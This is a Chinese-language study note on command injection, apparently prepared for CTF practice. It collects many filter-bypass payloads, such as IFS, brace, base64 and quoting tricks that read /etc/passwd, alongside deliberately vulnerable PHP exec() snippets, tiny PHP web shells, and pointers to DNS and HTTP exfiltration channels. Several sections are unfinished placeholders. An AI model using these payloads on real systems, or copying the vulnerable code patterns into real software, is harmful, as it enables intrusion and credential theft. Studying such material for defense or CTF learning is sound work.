# 命令注入漏洞

## 基础

`Shell`这个单词的原意是“外壳”，跟`kernel`（内核）相对应，比喻内核外面的一层，即用户跟内核交互的对话界面，也可理解为命令行接口。Linux下的`shell`有： 
- Bourne Shell (`/usr/bin/sh` or `/bin/sh`)，简称`sh`
- Bourne Again Shell (`/bin/bash`)，简称`bash`
- C Shel（`/usr/bin/csh`），简称`csh`
- Korn Shell (`/usr/bin/ksh`)，简称`ksh`
- Z Shell（`/usr/bin/zsh` or `/bin/zsh`）简称`zsh`

`bash`是绝大多数Linux发行版的默认shell。

终端（`terminal`）是通过向用户提供接口来访问`shell`的程序，允许用户通过输入命令并在文本界面查看命令输出。也被成为`控制台`或`命令行界面`。

![](https://media.geeksforgeeks.org/wp-content/uploads/18834419_1198504446945937_35839918_n-300x291.png)

Linux下终端一般为
`/bin/bash`、`/bin/sh` 和`/bin/zsh等，我们通常以`/bin/bash`进行测试。
输入输出重定向
命令行通配符

`$(ls)`
ls${}${IFS}id

### Bash基础
变量
模式扩展
- 花括号扩展
输出重定向

`command > file	`，将输出重定向到file 
- [Bash 脚本教程 - 阮一峰](https://wangdoc.com/bash/intro)
- [Bash Reference Manual](https://www.gnu.org/software/bash/manual/bash.html)

### 命令分隔符

|名称|例子|说明|
|---|---|---|
|;|`whoami;ls`|分割每条命令，命令按照从左到右的顺序执行，所有命令都会执行。Windows系统下命令提示符`cmd`无此语法|
|&&|`whoami&&ls`|逻辑与，只有第一条命令执行成功，才会执行第二条命令|
|\|\||`whoami\|\|ls`|逻辑或，只有第一条命令执行失败，才会执行第二条命令|
|\|||管道符，两条命令都执行，其中第一条命令的输出作为第二条命令的输入，即不显示第一条命令的输出|
|&||后台执行，两条命令都执行|
|%0a，%0d||PHP环境下|

## 文件读取命令
## 绕过技巧

<style>
  .markmap {
    width: 100%;
    height: 500px;
  }
</style>

```markmap
# RCE绕过技巧

## 空格绕过
- IFS
- {}
- 十六进制
## 长度限制绕过
- 五字符
- 四字符
## 无数字字母
 - 123

## 无回显

 - 345
```

### 空格绕过

```php
<?php
highlight_file(__FILE__);

$cmd = str_replace(" ", "", $_GET['cmd'];
echo "CMD: " . $cmd . PHP_EOL;
exec($cmd);
```

- `$IFS`、`${IFS}`、`$IFS$9`

环境变量IFS（**I**nternal **F**ield **S**eparator，内部字段分隔符），默认情况下由`空格`、`制表符`和`换行符`组成，可通过`set`命令查看。

`${IFS}`使用`{}`可以避免出现变量名与其他字符连用的情况。`$9`是当前命令的第9个参数，通常为空。习惯上，使用`$IFS$9`可避免避免变量名连用，也不出现花括号。


```bash
cat$IFS/etc/passwd
cat${IFS}flag
cat$IFS$9flag
```

- `{}`

```bash
{cat,/etc/passwd}
```

- 重定向

```bash
# 输入重定向
cat</etc/passwd

# 打开文件描述符
cat<>/etc/passwd
```

- `$'string'`特殊类型的单引号

`$''`属于[特殊的单引号](https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting)，支持转义字符。

```bash
# 十六进制
X=$'cat\x20/etc/passwd';$X

# 换行符
x=$'cat\n/etc/passwd';$x
x=$'cat\t/etc/passwd';$x
```

### 黑名单关键字绕过

- 变量

```bash
# 变量拼接
a=f;b=lag;cat $a$b # cat flag

# 未初始化的变量，等价于null
ca${u}t f${u}lag
```

- 转换

```bash
# base64
echo "d2hvYW1pCg=="|base64 -d|sh # whoami
echo "d2hvYW1pCg=="|base64 -d|$0 # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# 逆序
$(rev<<<'imaohw') # whoami

# 大小写
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

```

- 模式扩展

```bash
# 通配符`?`代表任意单个字符，不包括空字符，如果匹配多个字符，需要多个`?`连用
cat fla?
cat fl??

# 通配符`*`代表任意数量的任意字符，包括零个字符
cat f*

# 方括号扩展[]
cat [f]lag

# 花括号扩展{}
cat {f,}lag

# 子命令扩展

cat /fla$(u)g
cat /fla`u`g
```

- 引号

```bash
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
wh''oami
```

- 反斜线（转义字符）

```bash
wh\oami
```

- 位置参数的特殊变量`$@`和`$*`  

`$@`和`$*`代表全部的位置参数，当没有位置参数时，扩展为空。如，``

```bash
who$@ami
who$*ami
```

### 绕过管道符`|`

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### 反斜杠`\`和斜杠`/`绕过

```bash
# ${varname:offset:length} 子字符串
cat ${HOME:0:1}etc${HOME:0:1}passwd

# d
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过IP限制

```bash
127.0.0.1 == 2130706433
```
### 长度限制绕过

```
<?=`$_GET[1]`;
<? `$_GET[1]`;


<?php
highlight(__FILE__);

$code = $_GET['code'];
if(strlen($code)<=1) {
	eval("?>".$code)
}



任意代码执行，13-14
反弹shell

蚁剑插件 提权 绕过disable_functions

disable_functions openbasedir

$_GET[1]
```

#### 15位


- 命令执行5位 （HITCON 2017 Quals Babyfirst Revenge）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
	@exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
	@exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```
 
- 命令执行4位（HITCON 2017 Quals Babyfirst Revenge v2）

```php
<?php
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
	@exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
	@exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
```

### 无字母数字

```php
preg_match('/[a-z0-9]/i', $code)

eval($code);
```

- 异或`^`
- 取反`~`
- 自增

### `disable_function`绕过
### 无回显

- 结果写入文件，二次返回

- DNS信道
dnslog.cn

- HTTP信道
https://requestrepo.com/

反弹shell

https://your-shell.com/

延时
### 无参数
### 其他

## 参考资料

- https://book.hacktricks.xyz/v/cn/linux-hardening/bypass-bash-restrictions
- https://github.com/PortSwigger/command-injection-attacker/blob/master/README.md


- https://paper.seebug.org/164/